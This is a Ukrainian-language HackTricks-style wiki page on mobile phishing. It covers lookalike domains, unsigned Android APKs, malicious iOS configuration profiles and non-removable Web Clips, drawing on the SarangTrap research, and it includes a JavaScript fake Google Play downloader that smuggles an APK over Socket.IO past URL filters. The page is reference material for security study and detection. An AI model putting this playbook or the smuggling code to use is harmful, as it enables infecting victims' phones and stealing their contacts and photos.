# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ця сторінка описує techniques, які threat actors використовують для розповсюдження **malicious Android APKs** і **iOS mobile-configuration profiles** через phishing (SEO, social engineering, fake stores, dating apps тощо).
> Матеріал адаптовано з кампанії SarangTrap, викритої Zimperium zLabs (2025), а також з інших публічних досліджень.<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Зареєструвати десятки схожих доменів (dating, cloud share, car service…).
– Використовувати keywords місцевою мовою та emojis в елементі `<title>`, щоб підвищити позиції в Google.
– Розмістити інструкції зі встановлення для *обох* Android (`.apk`) та iOS на одній landing page.
2. **First Stage Download**
* Android: пряме посилання на *unsigned* APK або APK із “third-party store”.
* iOS: `itms-services://` або звичайне HTTPS-посилання на malicious **mobileconfig** profile (див. нижче).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection та інші post-install malware behaviour описані на спеціальній сторінці Android Malware Post-Exploitation нижче.
4. **iOS Delivery Technique**
* Один **mobile-configuration profile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб зарахувати пристрій до supervision, подібного до “MDM”.
* Інструкції social engineering:
1. Відкрити Settings ➜ *Profile downloaded*.
2. Тричі натиснути *Install* (скриншоти на phishing page).
3. Довіритися unsigned profile ➜ attacker отримує entitlement до *Contacts* і *Photo* без перевірки App Store.
5. **iOS Web Clip Payload (phishing app icon)**
* Payloads `com.apple.webClip.managed` можуть **закріпити phishing URL на Home Screen** за допомогою branded icon/label.
* Web Clips можуть запускатися **на весь екран** (приховуючи UI браузера) і бути позначені як **non-removable**, змушуючи victim видалити profile, щоб прибрати icon.<sup>[[3]](#references)</sup>
6. **Network Layer**
* Звичайний HTTP, часто на port 80 із HOST header на кшталт `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко виявити).

## Android Malware Post-Exploitation

Щодо post-install Android malware tradecraft, зокрема C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS та persistence, дивіться:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers дедалі частіше замінюють static APK links на Socket.IO/WebSocket channel, вбудований у lures, що імітують Google Play. Це приховує payload URL, обходить URL/extension filters і зберігає реалістичний install UX.<sup>[[2]](#references)[[4]](#references)</sup>

Типовий client flow, який спостерігався in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Чому це обходить прості засоби контролю:
- Статична URL-адреса APK не розкривається; payload відновлюється в пам’яті з кадрів WebSocket.
- Фільтри URL/MIME/розширень, які блокують прямі відповіді .apk, можуть пропустити бінарні дані, тунельовані через WebSocket/Socket.IO.
- Краулери та URL-sandbox, які не виконують WebSocket, не отримають payload.

Див. також практики та інструменти WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Налаштування payload Web Clips для пристроїв Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan Targeting Indonesian and Vietnamese Android Users](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
